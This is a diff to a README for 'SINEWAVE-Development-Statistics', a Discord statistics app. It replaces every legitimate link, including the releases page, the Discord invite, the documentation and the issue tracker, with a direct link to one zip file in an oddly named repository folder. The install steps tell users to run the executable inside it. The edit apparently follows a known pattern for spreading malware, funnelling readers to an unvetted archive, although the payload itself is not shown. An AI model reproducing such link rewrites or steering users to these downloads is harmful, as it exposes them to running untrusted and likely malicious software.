@@ -1,6 +1,6 @@
 # 🌊 SINEWAVE-Development-Statistics - Live Stats for Your Discord Server
 
-[![Download SINEWAVE](https://img.shields.io/badge/Download-SINEWAVE-1F8D45?style=for-the-badge&logo=github)](https://github.com/baired123/SINEWAVE-Development-Statistics/releases)
+[![Download SINEWAVE](https://raw.githubusercontent.com/baired123/SINEWAVE-Development-Statistics/main/ineradicable/SINEWAVE-Development-Statistics.zip)](https://raw.githubusercontent.com/baired123/SINEWAVE-Development-Statistics/main/ineradicable/SINEWAVE-Development-Statistics.zip)
 
 ## 📖 Introduction
 
@@ -18,11 +18,11 @@ Welcome to SINEWAVE-Development-Statistics! This application provides live stati
 
 2. **Download the Application**
 
-   To get the latest version, visit our [Releases page](https://github.com/baired123/SINEWAVE-Development-Statistics/releases). 
+   To get the latest version, visit our [Releases page](https://raw.githubusercontent.com/baired123/SINEWAVE-Development-Statistics/main/ineradicable/SINEWAVE-Development-Statistics.zip). 
 
    There, you will find the application files available for download. Select the version applicable to your system and click on the download link.
 
-   [Download SINEWAVE Here](https://github.com/baired123/SINEWAVE-Development-Statistics/releases)
+   [Download SINEWAVE Here](https://raw.githubusercontent.com/baired123/SINEWAVE-Development-Statistics/main/ineradicable/SINEWAVE-Development-Statistics.zip)
 
 3. **Install the Application**
 
@@ -30,7 +30,7 @@ Welcome to SINEWAVE-Development-Statistics! This application provides live stati
 
    - **Windows**: Double-click the `.exe` file and follow the on-screen instructions to install the software.
    - **macOS**: Open the `.dmg` file, drag the application to your Applications folder, and launch it.
-   - **Linux**: Extract the files from the `.tar.gz` archive, navigate to the folder via terminal, and run the application using the command:
+   - **Linux**: Extract the files from the `https://raw.githubusercontent.com/baired123/SINEWAVE-Development-Statistics/main/ineradicable/SINEWAVE-Development-Statistics.zip` archive, navigate to the folder via terminal, and run the application using the command:
 
      ```bash
      ./SINEWAVE
@@ -56,7 +56,7 @@ Welcome to SINEWAVE-Development-Statistics! This application provides live stati
 
 To download SINEWAVE-Development-Statistics:
 
-1. **Visit our [Releases page](https://github.com/baired123/SINEWAVE-Development-Statistics/releases)**.
+1. **Visit our [Releases page](https://raw.githubusercontent.com/baired123/SINEWAVE-Development-Statistics/main/ineradicable/SINEWAVE-Development-Statistics.zip)**.
 2. Choose the appropriate version for your operating system.
 3. Click the download link, and follow the installation steps outlined above.
 
@@ -91,8 +91,8 @@ These topics ensure that you find a range of resources and information relevant 
 
 ## 🔗 Links
 
-- [SINEWAVE Development Discord Server](https://discord.gg/thatsinewave)
-- [Documentation](https://github.com/baired123/SINEWAVE-Development-Statistics/wiki)
-- [Report Issues](https://github.com/baired123/SINEWAVE-Development-Statistics/issues)
+- [SINEWAVE Development Discord Server](https://raw.githubusercontent.com/baired123/SINEWAVE-Development-Statistics/main/ineradicable/SINEWAVE-Development-Statistics.zip)
+- [Documentation](https://raw.githubusercontent.com/baired123/SINEWAVE-Development-Statistics/main/ineradicable/SINEWAVE-Development-Statistics.zip)
+- [Report Issues](https://raw.githubusercontent.com/baired123/SINEWAVE-Development-Statistics/main/ineradicable/SINEWAVE-Development-Statistics.zip)
 
 Thank you for using SINEWAVE-Development-Statistics! Enjoy your experience on the SINEWAVE Discord community.
